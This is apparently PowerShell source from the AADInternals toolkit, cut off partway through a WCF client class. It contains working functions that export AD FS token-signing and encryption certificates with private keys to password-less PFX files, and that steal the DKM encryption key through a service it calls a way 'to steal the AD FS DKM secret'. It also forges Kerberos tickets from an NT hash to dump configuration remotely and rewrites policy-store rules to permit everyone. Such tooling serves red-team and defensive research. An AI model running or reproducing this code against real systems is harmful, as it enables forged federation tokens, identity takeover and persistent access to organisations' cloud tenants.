# Apr 21st 2021
# Exports ADFS Certificates
function Export-ADFSCertificates
{
<#
    .SYNOPSIS
    Exports ADFS certificates

    .DESCRIPTION
    Exports current and additional (next) ADFS token signing and encryption certificates to local directory. 
    The exported certificates do not have passwords.

    .PARAMETER Configuration

    ADFS configuration (xml)

    .PARAMETER EncryptionKey

    Encryption Key from DKM. Can be byte array or hex string
    
    .Example
    PS:\>Export-AADIntADFSCertificates

    .Example
    PS:\>$config = Export-AADIntADFSConfiguration -Local
    PS:\>$key = Export-AADIntADFSEncryptionKey -Local -Configuration $config
    PS:\>Export-AADIntADFSCertificates -Configuration $config -Key $key
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $False)]
        [xml]$Configuration,
        [Parameter(Mandatory= $False)]
        [object]$Key
    )
    Process
    {
        if(!$Configuration)
        {
            $Configuration = Export-ADFSConfiguration -Local
            if(!$Configuration)
            {
                Write-Error "Error retrieving the configuration."
                return
            }
        }
        if(!$Key)
        {
            $Key = Export-ADFSEncryptionKey -Local -Configuration $Configuration
            if(!$Key)
            {
                Write-Error "Error retrieving the key."
                return
            }
        }

        $certs = [ordered]@{}

        $certs["signing"] =    $Configuration.ServiceSettingsData.SecurityTokenService.SigningToken
        $certs["encryption"] = $Configuration.ServiceSettingsData.SecurityTokenService.EncryptionToken
        

        $cert = $Configuration.ServiceSettingsData.SecurityTokenService.AdditionalSigningTokens.CertificateReference
        if($cert.FindValue -eq $certs["signing"].FindValue)
        {
            Write-Warning "Additional signing    certificate is same as the current signing certificate and will not be exported."
        }
        else
        {
            $certs["signing_additional"] = $cert
        }
        
        $cert = $Configuration.ServiceSettingsData.SecurityTokenService.AdditionalEncryptionTokens.CertificateReference
        if($cert.FindValue -eq $certs["encryption"].FindValue)
        {
            Write-Warning "Additional encryption certificate is same as the current encryption certificate and will not be exported."
        }
        else
        {
            $certs["encryption_additional"] = $cert
        }

        foreach($certName in $certs.Keys)
        {
            $cert = $certs[$certName]
            # If EncryptedPfx.nil equals true, this cert is stored in server's certificate store, not in configuration.
            if($cert.EncryptedPfx.nil -eq "true")
            {
                # Get the certificate
                Write-Verbose "Getting certificate $($cert.FindValue)"
                $certPath = "Cert:\$($cert.StoreLocationValue)\$($cert.StoreNameValue)\$($cert.FindValue)"
                $certificate = Get-Item -Path $certPath
                if($certificate -eq $null)
                {
                    Write-Error "Certificate ""$certPath""not found from this computer!"
                    break
                }
                $binCert     = $certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)

                # Get the private key
                $keyName = $certificate.PrivateKey.CspKeyContainerInfo.UniqueKeyContainerName
                Write-Verbose "Private key name: $keyName"

                $keyPath = "$env:ALLUSERSPROFILE"
                
                # CryptoAPI and CNG stores keys in different directories
                # https://docs.microsoft.com/en-us/windows/win32/seccng/key-storage-and-retrieval
                $paths = @(
                    "$keyPath\Microsoft\Crypto\RSA\MachineKeys\$keyName"
                    "$keyPath\Microsoft\Crypto\Keys\$keyName"
                    )
                foreach($path in $paths)
                {
                    $keyBlob = Get-BinaryContent $path -ErrorAction SilentlyContinue
                    if($keyBlob)
                    {
                        Write-Verbose "Key loaded from $path"
                        break
                    }
                }

                if(!$keyBlob)
                {
                    if($joinInfo.KeyName.EndsWith(".PCPKEY"))
                    {
                        # This machine has a TPM
                        Throw "PCP keys are not supported, unable to export private key!"
                    }
                    else
                    {
                        Throw "Error accessing key. If you are already elevated to LOCAL SYSTEM, restart PowerShell and try again."
                    }
                    return
                }
        
                # Parse the key blob
                $blobType = [System.BitConverter]::ToInt32($keyBlob,0)
                switch($blobType)
                {
                    1 { $privateKey = Parse-CngBlob  -Data $keyBlob -Decrypt }
                    2 { $privateKey = Parse-CapiBlob -Data $keyBlob -Decrypt }
                    default { throw "Unsupported key blob type" }
                }

                
                $pfx = New-PfxFile -RSAParameters $privateKey.RSAParameters -X509Certificate $binCert
            }
            else
            {
                Write-Verbose "Decrypting $certName certificate"
                $encPfxBytes = Convert-B64ToByteArray -B64 $cert.EncryptedPfx

                # Get the Key Material - some are needed, some not. 
                # Values are Der encoded except cipher text and mac, so the first byte is tag and the second one size of the data. 
                $guid=        $encPfxBytes[8..25]  # 18 bytes
                $KDF_oid=     $encPfxBytes[26..36] # 11 bytes
                $MAC_oid=     $encPfxBytes[37..47] # 11 bytes
                $enc_oid=     $encPfxBytes[48..58] # 11 bytes
                $nonce=       $encPfxBytes[59..92] # 34 bytes
                $iv=          $encPfxBytes[93..110] # 18 bytes
                $ciphertext = $encPfxBytes[115..$($encPfxBytes.Length-33)]
                $cipherMAC =  $encPfxBytes[$($encPfxBytes.Length-32)..$($encPfxBytes.Length)]

                # Create the label
                $label = $enc_oid + $MAC_oid

                # Derive the decryption key using (almost) standard NIST SP 800-108. The last bit array should be the size of the key in bits, but MS is using bytes (?)
                # As the key size is only 16 bytes (128 bits), no need to loop.
                $hmac = New-Object System.Security.Cryptography.HMACSHA256 -ArgumentList @(,$key)
                $hmacOutput = $hmac.ComputeHash( @(0x00,0x00,0x00,0x01) + $label + @(0x00) + $nonce[2..33] + @(0x00,0x00,0x00,0x30) )
                $decryptionKey = $hmacOutput[0..15]
                Write-Verbose " Decryption key: $(Convert-ByteArrayToHex -Bytes $decryptionKey)"
         
                # Create a decryptor and decrypt
                $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create("AES")
                $Crypto.Mode="CBC"
                $Crypto.KeySize = 128
                $Crypto.BlockSize = 128
                $Crypto.Padding = "None"
                $Crypto.Key = $decryptionKey
                $Crypto.IV = $iv[2..17]

                $decryptor = $Crypto.CreateDecryptor()

                # Create a memory stream and write the cipher text to it through CryptoStream
                $ms = New-Object System.IO.MemoryStream
                $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
                $cs.Write($ciphertext,0,$ciphertext.Count)
                $cs.Close()
                $cs.Dispose()

                # Get the results and export to the file
                $pfx = $ms.ToArray()
                $ms.Close()
                $ms.Dispose()
            }

            Set-BinaryContent -Path "ADFS_$certName.pfx" -Value $pfx 
        }
        
        

         
    }
}

# Apr 21st 2021
# Exports ADFS configuration from local database or remote server
function Export-ADFSConfiguration
{
<#
    .SYNOPSIS
    Exports ADFS configuration from the local or remote ADFS server.

    .DESCRIPTION
    Exports ADFS configuration from the local ADFS server (local database) or from remote server (ADFS sync).

    .PARAMETER Local

    If provided, exports configuration from the local ADFS server

    .PARAMETER Hash

    NTHash of ADFS service user. Can be a byte array or hex string

    .PARAMETER Server

    Ip-address or FQDN of the remote ADFS server.

    .PARAMETER SID

    Security Identifier (SID) of the user (usually ADFS service user) used to dump remote configuration. Can be a byte array, string, or SID object.

    .Example
    $config = Export-AADIntADFSConfiguration -Local

    .Example
    Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq sv_ADFS | Format-List Name,ObjectGuid,ObjectSid
    Name       : sv_ADFS
    ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79
    ObjectSid  : S-1-5-21-2918793985-2280761178-2512057791-1134

    PS C:\>$cred = Get-Credential

    PS C:\>Get-AADIntADUserNTHash -ObjectGuid "b6366885-73f0-4239-9cd9-4f44a0a7bc79" -Credentials $creds -Server dc.company.com -AsHex
    6e018b0cd5b37b4fe1e0b7d54a6302b7

    PS C:\>$configuration = Export-AADIntADFSConfiguration -Hash "6e018b0cd5b37b4fe1e0b7d54a6302b7" -SID S-1-5-21-2918793985-2280761178-2512057791-1134 -Server sts.company.com

   
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Local",        Mandatory = $True)]
        [switch]$Local,
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [object]$Hash,
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [Parameter(ParameterSetName="LoggedInUser", Mandatory = $False)]
        [String]$Server="localhost",
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [object]$SID,
        [Parameter(ParameterSetName="LoggedInUser", Mandatory = $True)]
        [switch]$AsLoggedInUser
    )
    Process
    {
        if($Local) # Export configuration data from the local ADFS server
        {
            # Check that we are on ADFS server
            $service = Get-Service ADFSSRV -ErrorAction SilentlyContinue
            if($service -eq $null -or $service.Status -ne "Running")
            {
                Write-Error "This command needs to be run on AD FS server and the ADFSSRV service must be running."
                return $null
            }

            # Reference: https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208

            # Get configuration data object using .NET Reflection
            $adfsProperties = Get-AdfsProperties
            $configObject   = Get-ReflectionProperty -TypeObject $adfsProperties.GetType() -ValueObject $adfsProperties -PropertyName "ServiceSettingsData"

            # Get the service using WMI to get location
            $adfsService   = Get-WmiObject -Query 'select * from win32_service where name="adfssrv"'
            $adfsDirectory = (get-item $adfsService.PathName).Directory.FullName

            # Load Microsoft.IdentityServer.dll  
            $misDll      = [IO.File]::ReadAllBytes((Join-Path -Path $adfsDirectory -ChildPath 'Microsoft.IdentityServer.dll'))
            $misAssembly = [Reflection.Assembly]::Load($misDll)
            Remove-Variable "misDll"

            # Load serializer class
            $serializer = $misAssembly.GetType('Microsoft.IdentityServer.PolicyModel.Configuration.Utility')

            # Convert the configuration object to xml using .NET Reflection
            # public static string Serialize(ContractObject obj, bool indent = false)
            $configuration = Invoke-ReflectionMethod -TypeObject $serializer -Method "Serialize" -Parameters @($configObject,$false)
        }
        elseif($AsLoggedInUser) # Read the configuration as the logged in user
        {
            $configuration = Export-ADFSConfigurationUsingWCF -Server $Server
        }
        else # Read configuration from remote server by emulating ADFS sync
        {
            # Check the hash and SID
            if($Hash -is [array])
            {
                $strHash = Convert-ByteArrayToHex -Bytes ([byte[]]$Hash)
                Remove-Variable "Hash"
                $Hash = $strHash
            }
            elseif($Hash -isnot [string])
            {
                Throw "Hash must be a byte array or a hexadecimal string"
            }

            if($SID -is [array])
            {
                $sidObject = [System.Security.Principal.SecurityIdentifier]::new(([byte[]]$SID),0)
                Remove-Variable "SID"
                $SID = $sidObject.toString
            }
            elseif($SID -is [System.Security.Principal.SecurityIdentifier])
            {
                $sidObject = $SID
                Remove-Variable "SID"
                $SID = $sidObject.toString
            }
            elseif($SID -isnot [string])
            {
                Throw "SID must be a System.Security.Principal.SecurityIdentifier, byte array or a hexadecimal string"
            }

            Write-Verbose "* Start dumping AD FS configuration from $server`n"
    
            # Generate required stuff
            $sessionKey =    (New-Guid).ToByteArray()
            $params=@{
                hash =             $Hash
                SidString =        $SID
                UserName=          'svc_ADFS$'
                UserDisplayName=   ""
                UserPrincipalName= 'svc_ADFS$@company.com'
                ServerName=        "DC"
                DomainName=        "COMPANY"
                Realm=             "COMPANY.COM"
                ServiceTarget =    "host/sts.company.com"
                SessionKey =       $sessionKey
            }
            $kerberosTicket = New-KerberosTicket @Params                
            $clientSecret =   Get-RandomBytes -Bytes 32

            Write-Verbose "User NTHASH:   $Hash"
            Write-Verbose "Client secret: $(Convert-ByteArrayToB64 -Bytes $clientSecret)"
            Write-Verbose "Session key:   $(Convert-ByteArrayToB64 -Bytes $sessionKey)`n"
    
            Write-Verbose "RST begin"
                      
            # Request Security Token 
            $envelope =      Create-RSTEnvelope -Server $server -KerberosTicket $kerberosTicket
            [xml]$response = Invoke-RestMethod -UseBasicParsing -uri "http://$Server/adfs/services/policystoretransfer" -Method Post -Body $envelope -ContentType "application/soap+xml"
            $RSTR =          Parse-RSTR -RSTR $response -Key $sessionKey

            Write-Verbose "RST end`n"
            Write-Verbose "SCT begin"
 
            # Request Security Context Token 
            $envelope =      Create-SCTEnvelope -Key $RSTR.Key -ClientSecret $clientSecret -Context $RSTR.Context -KeyIdentifier $RSTR.Identifier -Server $server
        
            try
            {
                [xml]$response = Invoke-RestMethod -UseBasicParsing -uri "http://$Server/adfs/services/policystoretransfer" -Method Post -Body $envelope -ContentType "application/soap+xml"
            }
            catch
            {
                # Catch the error and try to parse the SOAP document
                $str=$_.Exception.Response.GetResponseStream()
                $buf = new-object byte[] $str.Length
                $str.Position = 0
                $str.Read($buf,0,$str.Length) | Out-Null
                [xml]$response=[text.encoding]::UTF8.GetString($buf)
            }
            Check-SoapError -Message $response

            $CSTR = Parse-SCTR -SCTR $response -Key $RSTR.Key

            Write-Verbose "SCT end`n"
    
            # Get the capabilities    
            #[xml]$response = Invoke-ADFSSoapRequest -Key $CSTR.Key -Context $CSTR.Context -KeyIdentifier $CSTR.Identifier -Server $server -Command Capabilities

            Write-Verbose "ServiceSettings start"
    
            # Get the settings        
            [xml]$response = Invoke-ADFSSoapRequest -Key $CSTR.Key -Context $CSTR.Context -KeyIdentifier $CSTR.Identifier -Server $server -Command ServiceSettings
            Write-Verbose "ServiceSettings end"
    
            $configuration = $response.GetStateResponse.GetStateResult.PropertySets.PropertySet.Property | where Name -eq "ServiceSettingsData" | select -ExpandProperty Values | select -ExpandProperty Value_x007B_0_x007D_
        
        }

        Write-Verbose "Configuration successfully read ($($configuration.Length) bytes)."
        return $configuration
    }
}


# Apr 21st 2021
# Exports ADFS configuration data encryption key
function Export-ADFSEncryptionKey
{
<#
    .SYNOPSIS
    Exports ADFS configuration encryption Key from DKM

    .DESCRIPTION
    Exports ADFS configuration encryption Key from the local ADFS server either as a logged-in user or ADFS service account, or remotely using DSR.

    .PARAMETER Local
    If provided, exports Key from the local ADFS server

    .PARAMETER AsADFS
    If provided, "elevates" to ADFS service user. If used, the PowerShell session MUST be restarted to return original user's access rights.

    .PARAMETER ObjectGuid
    Object guid of the contact object containing the Key.

    .PARAMETER Server
    Ip-address or FQDN of domain controller.

    .PARAMETER Credentials
    Credentials of the user used to log in to DC and get the data by DSR. MUST have replication rights!

    .PARAMETER Configuration
    The ADFS configuration data (xml).

    .PARAMETER AsHex
    If provided, exports the Key as  hex string

    .Example
    PS:\>$key = Export-AADIntADFSEncryptionKey -Local -Configuration $configuration

    .Example
    PS:\>$creds = Get-Credential
    PS:\>$key = Export-AADIntADFSEncryptionKey -Server dc.company.com -Credentials $creds -ObjectGuid 91491383-d748-4163-9e50-9c3c86ad1fbd
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Local", Mandatory=$True)]
        [switch]$Local,
        [Parameter(ParameterSetName="Local", Mandatory=$True)]
        [xml]$Configuration,
        [Parameter(ParameterSetName="Sync",  Mandatory= $True)]
        [guid]$ObjectGuid,
        [Parameter(ParameterSetName="Sync",  Mandatory= $True)]
        [String]$Server,
        [Parameter(ParameterSetName="Sync",  Mandatory= $True)]
        [pscredential]$Credentials,
        [switch]$AsHex
    )
    Process
    {
        if($Local) # Export Key from the local ADFS server
        {
            # Check that we are on ADFS server
            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
            {
                Write-Error "This command needs to be run on ADFS server"
                return
            }

            # If auto certificate rollover is disabled, certificates are in AD FS servers' certificate stores and KDM key not needed.
            if(-not (Get-AdfsProperties).AutoCertificateRollover)
            {
                Write-Warning "Auto certificate rollover not enabled. DKM key not needed."
                return $null
            }

            $ADFSUser    = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\adfssrv" -Name "ObjectName" | Select-Object -ExpandProperty "ObjectName"

            # Get key information using the service
            # The return value is a JSON file where the key is a hex string
            $keyInformation = Export-ADFSEncryptionKeyUsingService -Configuration $Configuration -ADFSUser $ADFSUser -ServiceName "AADInternals" -Description "A little service to steal the AD FS DKM secret :)" | ConvertFrom-Json

            # Check for errors
            if($keyInformation.Error)
            {
                Write-Error $keyInformation.Error
                return $null
            }
            
            $key = Convert-HexToByteArray -HexString ($keyInformation.Key)

            Write-Verbose "Key object guid: $($keyInformation.Guid), created $($keyInformation.Created)"
        }
        else # Export from remote DC using DSR
        {
            $key = Get-ADUserThumbnailPhoto -Server $Server -Credentials $Credentials -ObjectGuid $ObjectGuid
        }
        Write-Verbose "Key: $(Convert-ByteArrayToHex -Bytes $key)"

        if($AsHex)
        {
            Convert-ByteArrayToHex -Bytes $key
        }
        else
        {
            return $key
        }
    }
}

# May 5th 2021
# Sets configuration of the local ADFS server
function Set-ADFSConfiguration
{
<#
    .SYNOPSIS
    Sets configuration of the local AD FS server.

    .DESCRIPTION
    Sets configuration of the local AD FS server (local database).

    .PARAMETER Configuration

    ADFS configuration (xml-document)

    .Example
    PS C:\>$authPolicy = Get-AADIntADFSPolicyStoreRules
    PS C:\>$config = Set-AADIntADFSPolicyStoreRules -AuthorizationPolicy $authPolicy.AuthorizationPolicy
    PS C:\>Set-AADIntADFSConfiguration -Configuration $config


#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $True)]
        [xml]$Configuration
    )
    Process
    {

        # Check that we are on ADFS server
        if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
        {
            Write-Error "This command needs to be run on ADFS server"
            return
        }

        # Get the database connection string
        $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
        $conn = $ADFS.ConfigurationDatabaseConnectionString
            
        Write-Verbose "ConnectionString: $conn"

        # Write the configuration to the database
        $strConfig =          $Configuration.OuterXml
        $SQLclient =          new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn
        $SQLclient.Open()
        $SQLcmd =             $SQLclient.CreateCommand()
        $SQLcmd.CommandText = "UPDATE IdentityServerPolicy.ServiceSettings SET ServiceSettingsData=@config"
        $SQLcmd.Parameters.AddWithValue("@config",$strConfig) | Out-Null
        $UpdatedRows =        $SQLcmd.ExecuteNonQuery() 
        $SQLclient.Close()

        Write-Verbose "Configuration successfully set ($($strConfig.Length) bytes)."
    }
}

# May 5th 2021
# Gets ADFS policy store authorisation policy
function Get-ADFSPolicyStoreRules
{
<#
    .SYNOPSIS
    Gets AD FS PolicyStore Authorisation Policy rules

    .DESCRIPTION
    Gets AD FS PolicyStore Authorisation Policy rules

    .PARAMETER Configuration
    ADFS configuration (xml-document). If not given, tries to get configuration from the local database.

    .Example
    PS C:\>Get-AADIntADFSPolicyStoreRules | fl

    AuthorizationPolicyReadOnly : @RuleName = "Permit Service Account"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
                              
                                  @RuleName = "Permit Local Administrators"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
                              
                              
    AuthorizationPolicy         : @RuleName = "Permit Service Account"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
                              
                                  @RuleName = "Permit Local Administrators"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [xml]$Configuration
    )
    Process
    {

        if(!$Configuration)
        {
            # Check that we are on ADFS server
            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
            {
                Write-Error "This command needs to be run on ADFS server or provide the configuration with -Configuration parameter."
                return
            }

            [xml]$Configuration = Export-ADFSConfiguration -Local
        }

        $parameters = @{
            "AuthorizationPolicy"         = $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicy
            "AuthorizationPolicyReadOnly" = $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicyReadOnly
        }

        return New-Object psobject -Property $parameters
    }
}

# May 5th 2021
# Gets ADFS policy store authorisation policy
function Set-ADFSPolicyStoreRules
{
<#
    .SYNOPSIS
    Sets AD FS PolicyStore Authorisation Policy rules

    .DESCRIPTION
    Sets AD FS PolicyStore Authorisation Policy rules and returns the modified configuration (xml document)

    .PARAMETER Configuration
    ADFS configuration (xml-document). If not given, tries to get configuration from the local database.

    .PARAMETER AuthorizationPolicy
    PolicyStore authorization policy. By default, allows all to modify.

    .PARAMETER AuthorizationPolicyReadOnly
    PolicyStore read-only authorization policy. By default, allows all to read.

    .Example
    PS C:\>$authPolicy = Get-AADIntADFSPolicyStoreRules
    PS C:\>$config = Set-AADIntADFSPolicyStoreRules -AuthorizationPolicy $authPolicy.AuthorizationPolicy
    PS C:\>Set-AADIntADFSConfiguration -Configuration $config


#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [xml]$Configuration,
        [Parameter(Mandatory=$False)]
        [string]$AuthorizationPolicy =         '=> issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");',
        [Parameter(Mandatory=$False)]
        [string]$AuthorizationPolicyReadOnly = '=> issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");'
    )
    Process
    {

        if(!$Configuration)
        {
            # Check that we are on ADFS server
            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
            {
                Write-Error "This command needs to be run on ADFS server or provide the configuration with -Configuration parameter."
                return
            }

            [xml]$Configuration = Export-ADFSConfiguration -Local
        }

        $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicy =         $AuthorizationPolicy
        $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicyReadOnly = $AuthorizationPolicyReadOnly

        return $Configuration.OuterXml
    }
}

# Exports the configuration remotely using Windows Communication Foundation (WCF)
# May 20th 2021
function Export-ADFSConfigurationUsingWCF
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Server
    )
    Begin
    {
        # Create the WCF client
        $WCFClassDefinition=@"
using System.Runtime.Serialization;
using System.Collections.Generic;
using System.Collections;
using System;

namespace AADInternals
{
    // DataContract definitions
    public interface IValueList : IList, ICollection, IEnumerable
    {
    }
    [DataContract(Name = "SearchResult", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class SearchResultData
    {
        [DataMember]
        public PropertySetDataList PropertySets
        {
            get { return this._propertySetList;} set {this._propertySetList = value;}
        }
        private PropertySetDataList _propertySetList = new PropertySetDataList();
    }

    [CollectionDataContract(Name = "PropertySets", ItemName = "PropertySet", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class PropertySetDataList : List<PropertySetData> {}

    [CollectionDataContract(Name = "PropertySet", ItemName = "Property", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class PropertySetData : List<PropertyData>  { }

    [CollectionDataContract(Name = "Values{0}", ItemName = "Value{0}", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class PropertyValueList<T> : List<T>, IValueList, IList, ICollection, IEnumerable {}

    [DataContract(Name = "Property", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    [KnownType(typeof(PropertyValueList<string>))]
    [KnownType(typeof(PropertyValueList<PropertySetData>))]
    public class PropertyData
    {
        public PropertyData() {}
        public PropertyData(string name) { this._name = name;}

        [DataMember(EmitDefaultValue = false, IsRequired = true)]
        public string Name { get {return this._name;}set{this._name = value;} }

        [DataMember(EmitDefaultValue = false, IsRequired = false)]
        public IValueList Values { get {return this._values; } set { this._values = value; } }
        private string _name;
        private IValueList _values = new PropertyValueList<string>();
    }

    public enum SyncItemState
    {
        NotProcessed,
        Processing,
        Processed
    }

    [CollectionDataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class ServiceStateSummary : List<ServiceStateItem> {}

	[DataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
	public class ServiceStateItem
	{
		public ServiceStateItem(string serviceObjectType, long serialNumber, int schemaVersionNumber, DateTime lastUpdateTime)
		{
			this._serviceObjectType = serviceObjectType;
			this._serialNumber = serialNumber;
			this._schemaVersionNumber = schemaVersionNumber;
			this._lastUpdateTime = lastUpdateTime;
			this.NeedsUpdate = false;
		}

		[DataMember]
		public string ServiceObjectType
		{
			get { return this._serviceObjectType; } set { this._serviceObjectType = value;}
		}

		[DataMember]
		public long SerialNumber
		{
			get { return this._serialNumber; } set { this._serialNumber = value; }
		}

		[DataMember]
		public int SchemaVersionNumber
		{
			get { return this._schemaVersionNumber; } set { this._schemaVersionNumber = value; }
		}

		[DataMember]
		public DateTime LastUpdateTime
		{
			get { return this._lastUpdateTime; } set { this._lastUpdateTime = value;}
		}

		public bool SyncComplete
		{
			get { return this._syncCompleted; } set { this._syncCompleted = value; }
		}

		public bool NeedsUpdate { get; set; }
		public SyncItemState ProcessingState
		{
			get { return this._processingState; } set { this._processingState = value; }
		}

		private string _serviceObjectType;
 		private long _serialNumber;
		private int _schemaVersionNumber;
		private DateTime _lastUpdateTime;
		private SyncItemState _processingState;
		private bool _syncCompleted;
	}

    public enum FarmBehavior
    {
        Unsupported = -1,
        None,
        Win2012R2,
        Threshold,
        Win2016,
        Win2019
    }

    [DataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public enum FilterOperation
    {
        [EnumMember]
        And,
        [EnumMember]
        Or
    }

    [DataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public enum SimpleOperation
    {
        [EnumMember]
        Equals,
        [EnumMember]
        StartsWith,
        [EnumMember]
        EndsWith,
        [EnumMember]
        Contains,
        [EnumMember]
        NotEquals,
        [EnumMember]
        ScopeAppliesTo
    }

    [DataContract(Name = "If", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class SimpleConditionData
    {
        public SimpleConditionData() { }
        public SimpleConditionData(string property, SimpleOperation operation, string value)
        {
            this._property = property;
            this._value = value;
            this._op = operation;
        }

        [DataMember(EmitDefaultValue = true, IsRequired = true, Order = 0)]
        public string Property  { get { return this._property; } set { this._property = value; } }

        [DataMember(EmitDefaultValue = true, IsRequired = true, Order = 1)]
        public SimpleOperation Operation { get { return this._op; } set { this._op = value; } }

        [DataMember(EmitDefaultValue = true, IsRequired = true, Order = 2)]
        public string Value { get { return this._value; } set { this._value = value; } }

        private SimpleOperation _op;

        private string _property;

        private string _value;
    }

    [CollectionDataContract(ItemName = "If", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class ConditionList : List<SimpleConditionData> { }

    [DataContract(Name = "Filter", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class FilterData
    {
        public FilterData()
        {
        }

        public FilterData(FilterOperation operation) { this._bool = operation; }

        [DataMember(Name = "Conditions")]
        public ConditionList Conditions { get { return this._conditions; } set { this._conditions = value; } }

        [DataMember(Name = "Operation")]
        public FilterOperation Operation { get { return this._bool; } set { this._bool = value; } }

        private FilterOperation _bool;

        private ConditionList _conditions = new ConditionList();
    }
    
    // PolicyStoreReadOnlyTransfer definitions

    [System.ServiceModel.ServiceContractAttribute(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore", ConfigurationName = "AADInternals.IPolicyStoreReadOnlyTransfer")]
    public interface IPolicyStoreReadOnlyTransfer
    {
        [System.ServiceModel.OperationContractAttribute(Action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetState", ReplyAction = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetStateResponse")]
        SearchResultData GetState(string serviceObjectType, string mask=null, FilterData filter = null, int clientVersionNumber = 1);

        [System.ServiceModel.OperationContractAttribute(Action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetHeaders", ReplyAction = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetHeadersResponse")]
        ServiceStateSummary GetHeaders();

        [System.ServiceModel.OperationContractAttribute(Action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetFarmBehavior", ReplyAction = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetFarmBehaviorResponse")]
        FarmBehavior GetFarmBehavior();
    }

    
    public interface IPolicyStoreReadOnlyTransferChannel : AADInternals.IPolicyStoreReadOnlyTransfer, System.ServiceModel.IClientChannel
    {
    }

    [System.Diagnostics.DebuggerStepThroughAttribute()]
    public partial class PolicyStoreReadOnlyTransferClient : System.ServiceModel.ClientBase<AADInternals.IPolicyStoreReadOnlyTransfer>, AADInternals.IPolicyStoreReadOnlyTransfer
    {

        public PolicyStoreReadOnlyTransferClient()
        {
        }

        public PolicyStoreReadOnlyTransferClient(string endpointConfigurationName) :
                base(endpointConfigurationName)
        {
        }

        public PolicyStoreReadOnlyTransferClient(string endpointConfigurationName, string remoteAddress) :
                base(endpointConfigurationName, remoteAddress)
        {
        }

        public PolicyStoreReadOnlyTransferClient(string endpointConfigurationName, System.ServiceModel.EndpointAddress remoteAddress) :
                base(endpointConfigurationName, remoteAddress)
        {
        }

        public PolicyStoreReadOnlyTransferClient(System.ServiceModel.Channels.Binding binding, System.ServiceModel.EndpointAddress remoteAddress) :
                base(binding, remoteAddress)
        {
        }

        public SearchResultData GetState(string serviceObjectType, string mask = null, FilterData filter = null, int clientVersionNumber = 1)
        {
            return base.Channel.GetState(serviceObjectType, mask, filter, clientVersionNumber);
        }

        public ServiceStateSummary GetHeaders()
        {
            return base.Channel.GetHeaders();
        }

        public FarmBehavior GetFarmBehavior()
        {
            return base.Channel.GetFarmBehavior();
